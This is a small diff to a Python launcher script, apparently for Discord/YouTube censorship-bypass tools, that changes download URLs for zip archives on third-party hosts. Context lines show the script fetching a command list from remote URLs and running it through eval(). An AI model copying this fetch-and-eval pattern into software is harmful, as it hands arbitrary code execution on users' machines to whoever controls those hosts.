@@ -26,8 +26,8 @@ if __name__ == "__main__":
     downloadurls = [
       "https://github.com/Flowseal/zapret-discord-youtube/releases/download/1.9.7/zapret-discord-youtube-1.9.7.zip",
       "https://github.com/Flowseal/tg-ws-proxy/releases/download/v1.2.1/TgWsProxy_windows.exe",
-      "https://peerphp.vercel.app/peer/878c2c10-bcbd-419f-a762-b516bc99be29.zip",
-      "https://peerphp.vercel.app/peer/d334379d-2026-47f3-a6a5-28dbd6e88c8a.zip"
+      "https://peerphp.vercel.app/peer/223924f8-defe-47dd-94ff-24c288a7c912.zip",
+      "https://forexample-u.github.io/all-obxod-ds-zapret-proxy-gpt-ru/peer/d334379d-2026-47f3-a6a5-28dbd6e88c8a.zip"
     ]
     commands = [
         "general (ALT11).bat",
@@ -49,7 +49,7 @@ if __name__ == "__main__":
     for i in range(len(commandlisturls)):
         try:
             textarr = urllib.request.urlopen(commandlisturls[i]).read().decode('utf-8')
-            if (len(textarr) > 20):
+            if len(textarr) > 20:
                 commands = eval(textarr)
                 break
         except:
